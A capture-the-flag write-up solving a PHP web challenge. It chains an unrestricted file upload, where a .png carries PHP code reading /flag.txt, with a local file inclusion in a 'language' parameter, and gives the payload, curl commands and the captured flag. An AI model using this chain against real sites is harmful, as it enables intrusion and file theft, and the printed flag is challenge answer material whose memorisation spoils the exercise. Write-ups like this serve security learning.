![Pasted image 20250228211743](pictures/Pasted%20image%2020250228211743.png)

check .zip file:

upload.php
#### **Unrestricted File Upload**

I can upload a file with a .png extension and put some PHP code inside.
![Pasted image 20250228222819](pictures/Pasted%20image%2020250228222819.png)
#### **Local File Inclusion (LFI)**

![Pasted image 20250228223154](pictures/Pasted%20image%2020250228223154.png)

With the LFI vulnerability, I can execute an arbitrary file

#### **Step 1: Upload the PHP File**

Create a file named `exploit.png` containing the following PHP code:

```php
<?php echo file_get_contents("/flag.txt"); ?>
```

![Pasted image 20250228220651](pictures/Pasted%20image%2020250228220651.png)

Then, upload it using `curl`:

```bash
curl -X POST -F "image=@exploit.png" http://challenge.ctf.games:32025/upload.php
```

![Pasted image 20250228220817](pictures/Pasted%20image%2020250228220817.png)
#### **Step 2: Find the Uploaded File Name**

Log.php:
![Pasted image 20250228221906](pictures/Pasted%20image%2020250228221906.png)
1. Access the server logs:
```bash
    curl http://challenge.ctf.games:32025/logs/site_log.txt
```

![Pasted image 20250228221255](pictures/Pasted%20image%2020250228221255.png)

2. Extract the filename:

```bash 
FILENAME="67c2252db47f9_exploit.png"
```

#### **Step 3: Execute the PHP Code via LFI**

Use the Local File Inclusion (LFI) vulnerability to execute the uploaded file:

```bash
curl "http://challenge.ctf.games:32025/conspiracy.php?language=uploads/67c2252db47f9_exploit.png"
```
- The PHP code will execute, and the flag will be displayed in the response.

![Pasted image 20250228222243](pictures/Pasted%20image%2020250228222243.png)
```
flag{6558608db040d1c64358ad536a8e06c6}
```
